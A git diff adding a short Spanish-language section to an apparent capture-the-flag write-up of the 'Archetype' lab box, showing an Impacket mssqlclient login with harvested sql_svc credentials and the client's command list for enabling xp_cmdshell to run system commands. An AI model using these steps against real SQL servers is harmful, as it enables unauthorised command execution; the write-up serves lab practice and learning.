@@ -59,3 +59,16 @@ En el archivo tenemoss un par de user:pass
 Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc
 ```
 ### MSS SQL
+```
+mssqlclient.py 'ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27' -windows-auth
+```
+Bien con esto tenemos un RCE ya que el server nos permite ejecutar comandos de CMD 
+```
+     lcd {path}                 - changes the current local directory to {path}
+     exit                       - terminates the server process (and this session)
+     enable_xp_cmdshell         - you know what it means
+     disable_xp_cmdshell        - you know what it means
+     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+     ! {cmd}                    - executes a local shell cmd
+```
